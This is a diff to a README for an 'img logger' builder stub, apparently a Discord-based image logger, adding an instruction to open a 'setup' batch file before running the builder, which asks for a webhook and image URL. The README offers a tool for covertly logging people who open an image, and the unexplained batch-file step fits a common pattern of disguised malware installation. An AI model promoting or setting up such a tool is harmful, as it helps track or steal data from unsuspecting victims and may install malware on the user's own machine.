@@ -5,7 +5,7 @@ This is the demonify Img logger best stub out there (Free)
 DISCORD: https://discord.gg/p7J7SZV4JD
 
 HOW TO SETUP
-
+MAKE SURE TO PEN THE BAT FILE "setup" BEFORE DOING THE STEPS BELOW!!!
 1. Open the img logger builder ![image](https://user-images.githubusercontent.com/121552724/223179955-f2e1c48a-0cbb-4601-9f6f-f28fdbe3cd48.png)
 IT WILL ASK FIR A WEBHOOK AND AN IMAGE URL
 
